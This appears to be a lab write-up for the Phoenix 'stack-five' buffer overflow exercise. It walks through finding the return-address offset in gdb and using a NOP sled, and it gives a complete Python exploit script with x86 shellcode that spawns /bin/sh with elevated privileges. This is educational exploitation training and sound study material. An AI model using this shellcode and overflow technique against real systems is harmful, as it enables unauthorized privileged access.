# stack-five

The challenge of this level is to execute /bin/sh to gain a priveleged shell. The source code is very simple: the program asks for user input with `gets`, and the input is written to a 128 bytes buffer. There is nothing here to prevent a buffer overflow. To execute a program on linux, we use the syscall `execve`:

```sh
man execve
SYNOPSIS
       #include <unistd.h>

       int execve(const char *pathname, char *const argv[],
                  char *const envp[]);

DESCRIPTION
       execve() executes the program referred to by pathname.  This causes the
       program that is currently being run by the calling process  to  be  re‐
       placed  with  a  new  program,  with newly initialized stack, heap, and
       (initialized and uninitialized) data segments.

       ...ouput omitted...

       argv  is  an  array  of argument strings passed to the new program.  By
       convention, the first of these strings (i.e., argv[0])  should  contain
       the filename associated with the file being executed.  envp is an array
       of strings, conventionally of the form key=value, which are  passed  as
       environment to the new program.  The argv and envp arrays must each in‐
       clude a null pointer at the end of the array.
```

What we can do is to write a small program in assembly, compile it to machine code, and then write that machine code to the stack. Then, we overwrite the return pointer and make it point to our code on the stack. The injected code is referred to as shellcode, because the goal is often to achieve a priveleged shell, but not always.

Let us begin by figuring out how far we have to write to hit the return pointer. Load stack-five into gdb and set a breakpoint at the return from start_level:

```sh
gef➤  disass start_level
Dump of assembler code for function start_level:
   0x08048485 <+0>:     push   ebp
   0x08048486 <+1>:     mov    ebp,esp
   0x08048488 <+3>:     sub    esp,0x88
   0x0804848e <+9>:     sub    esp,0xc
   0x08048491 <+12>:    lea    eax,[ebp-0x88]
   0x08048497 <+18>:    push   eax
   0x08048498 <+19>:    call   0x80482c0 <gets@plt>
   0x0804849d <+24>:    add    esp,0x10
   0x080484a0 <+27>:    nop
   0x080484a1 <+28>:    leave
=> 0x080484a2 <+29>:    ret
End of assembler dump.
gef➤  break *0x080484a2
Breakpoint 1 at 0x80484a2
```

Now, run the program with 128 A's to fill up the buffer, followed by B's, C's and so on. When the program stops at the breakpoint, examine the stack pointer.

```sh
gef➤  r <<< $(python -c 'print("A"*128 + "BBBBCCCCDDDDEEEEFFFFGGGG")')

...output omitted...

Breakpoint 1, 0x080484a2 in start_level ()
gef➤  x/2wx $esp
0xffffd5ec:     0x45454545      0x46464646
```

We see that esp points to our E's, at address 0xffffd5ec, right before ret is executed, so we have to replace the E's by whatever address we want to jump to. But exactly what value do we put there? We could write our code to execute /bin/sh right after the E's, so that the first instruction of our injected program is placed where the F's are now. In that case, we would simply have the return pointer also point to where the F's are now. But the with that is that the stack can move a little bit up or down, depending on environment variables, argv etc. Our exact, hard coded address might then not hit exactly where we intended.

A neat trick is to use a so-called nops slide; there exists an instruction called NOP (opcode 0x90), which stands for "no operation". It does nothing. The program just continues with the next instruction. If we write a bunch of these nop instructions after the return pointer, followed by our shellcode, we can then make the return pointer point somewhere roughly in the middle of the long chain of nops. As long as the stack doesn't move too much, we should always land somewhere in the nops slide and "slide" down until we hit the shellcode.

The Python script below is a summary of the discussion above. We don't have shellcode yet, but just a single instruction INT3, with opcode 0xcc, which is a call to an interrupt  procedure to generate a breakpoint trap. The variable `stack_addr` has been set to point somewhere in the nops slide. (Remember that 0xffffd5ec was the address of the return pointer.)

```python
shellcode = "\xcc"

nops = "\x90"*256

stack_addr = "\x40\xd6\xff\xff"

buff = ""
buff += "A"*128
buff += "BBBBCCCCDDDD"
buff += stack_addr
buff += nops
buff += shellcode

print(buff)
```

Let us run the program with the script output as input and see what happens:

```sh
user@phoenix-amd64:~$ python exploit.py | /opt/phoenix/i486/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Trace/breakpoint trap
```

Our "shellcode" was successfully executed. Now we just have to write shellcode that executes /bin/sh. How to actually write shellcode will be covered in a different article. For now, we will use the following:

```python
shellcode = "\x31\xc0\x31\xdb\x31\xc9\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\xeb\x1c\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x8d\x4b\x08\x8d\x53\x0c\xb0\x0b\xcd\x80\xe8\xdf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"

nops = "\x90"*256

stack_addr = "\x40\xd6\xff\xff"

buff = ""
buff += "A"*128
buff += "BBBBCCCCDDDD" # EEEEFFFFGGGG"
buff += stack_addr
buff += nops
buff += shellcode

print(buff)
```

The code first sets the real user id of the process equal to the effective user id of the process.
